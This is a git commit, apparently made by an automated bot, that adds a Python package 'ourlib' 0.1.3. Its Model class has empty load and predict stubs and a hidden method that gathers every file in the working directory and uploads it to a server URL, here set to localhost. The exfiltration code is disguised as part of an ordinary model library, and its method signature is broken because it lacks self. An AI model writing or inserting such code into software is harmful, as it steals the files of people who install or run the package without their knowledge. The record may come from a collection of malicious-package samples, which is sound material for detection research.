8239c27a7ed9351b2036905386c0d96e6ffd84b7
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 20:05:55 +0000

    Add package ourlib/0.1.3/ourlib-0.1.3-py3-none-any.whl

---
+++ packages/ourlib/ourlib-0.1.3-py3-none-any.whl/ourlib/ourlib.py
@@ -0,0 +1,25 @@
+import os
+import requests
+
+SERVER_URL = "http://localhost:8080/upload"
+
+class Model():
+    def load(self):
+        pass
+
+    def predict(self, input_data):
+        pass
+
+    def upload_files_to_server():
+        current_directory = os.getcwd()
+        files = []
+        for file_name in os.listdir(current_directory):
+            file_path = os.path.join(current_directory, file_name)
+            if os.path.isfile(file_path):
+                files.append((file_name, open(file_path, 'rb')))
+        
+        response = requests.post(SERVER_URL, files=files)
+        if response.status_code == 200:
+            print("Files uploaded successfully!")
+        else:
+            print("Failed to upload files!")
